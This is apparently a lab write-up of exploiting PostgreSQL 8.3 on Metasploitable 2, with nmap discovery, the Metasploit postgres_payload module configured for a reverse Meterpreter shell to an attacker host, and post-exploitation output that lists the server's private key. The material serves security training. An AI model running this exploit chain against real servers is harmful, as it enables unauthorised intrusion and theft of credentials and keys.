# 🐘 PostgreSQL Exploitation – Meterpreter Shell (Port 5432)

> This section describes how I exploited the PostgreSQL service on Metasploitable 2 to gain a Meterpreter shell.

---

## 🔍 Service Discovery

```bash
nmap -sV -p 5432 192.168.182.128
```

📌 Output:
- PostgreSQL DB 8.3.0 - 8.3.7

---

## 🔎 Step 1: Metasploit Exploit Search

```bash
search postgresql
```

Identified relevant module:
```bash
use exploit/linux/postgres/postgres_payload
```

---

## ⚙️ Step 2: Exploit Configuration

```bash
set RHOSTS 192.168.182.128
set RPORT 5432
set LHOST 192.168.182.129
set LPORT 4444
```

Confirmed with `show options`.

---

## 🚀 Step 3: Execute Exploit

```bash
run
```

📌 Result:
- Meterpreter shell session opened.

---

## 🧠 Step 4: Post-Exploitation Checks

```bash
sysinfo
```
📌 Output:
```
Computer    : metasploitable.localdomain
OS          : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture: i686
BuildTuple  : i486-linux-musl
Meterpreter : x86/linux
```

```bash
ls
```
📌 Listing:
```
/var/lib/postgresql/8.3/main

Mode       Size  Type  Last modified            Name
100600/rw-   4   fil   2010-03-17 10:08:46 -0400 PG_VERSION
040700/rwx 4096  dir   2010-03-17 10:08:56 -0400 base
040700/rwx 4096  dir   2024-09-08 22:36:03 -0400 global
040700/rwx 4096  dir   2010-03-17 10:08:56 -0400 pg_clog
040700/rwx 4096  dir   2010-03-17 10:08:46 -0400 pg_multixact
040700/rwx 4096  dir   2010-03-17 10:08:46 -0400 pg_subtrans
040700/rwx 4096  dir   2010-03-17 10:08:56 -0400 pg_tblspc
040700/rwx 4096  dir   2010-03-17 10:08:46 -0400 pg_twophase
040700/rwx 4096  dir   2010-03-17 10:08:56 -0400 pg_xlog
100600/rw- 125   fil   2010-09-08 22:13:39 -0400 postmaster.opts
100600/rw-  54   fil   2010-09-08 22:13:39 -0400 postmaster.pid
100644/r--  54   fil   2010-03-17 10:07:45 -0400 root.crt
100644/r-- 1224  fil   2010-03-17 10:07:45 -0400 server.crt
100644/r--  891  fil   2010-03-17 10:07:45 -0400 server.key
```

✅ Full control over PostgreSQL server achieved

---

## 🔐 Summary

| Element       | Details                              |
|---------------|---------------------------------------|
| Service       | PostgreSQL (8.3.x)                   |
| Exploit       | `postgres_payload` (Metasploit)      |
| Shell Type    | Meterpreter                          |
| Access Level  | System access                        |


